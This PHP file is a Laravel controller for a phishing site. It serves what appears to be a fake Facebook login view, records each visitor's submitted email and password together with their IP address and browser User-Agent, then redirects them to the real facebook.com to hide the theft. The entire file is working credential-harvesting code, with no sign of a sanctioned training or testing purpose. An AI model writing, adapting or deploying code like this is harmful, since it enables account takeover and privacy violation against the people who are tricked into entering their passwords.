<?php

namespace App\Http\Controllers;

use App\Models\PhishingLogs;
use Illuminate\Http\Request;

class PhishingController extends Controller
{
    public function showLoginPage()
    {
        return view('phishing.facebook');
    }
    public function captureCredentials(Request $request)
    {
        PhishingLogs::create([
            "email"=>$request->email,
            "password"=>$request->password,
            "ip_address"=>$request->ip(),
            "user_agent"=>$request->header("User-Agent")
        ]);
        return redirect("https://facebook.com");
    }
}
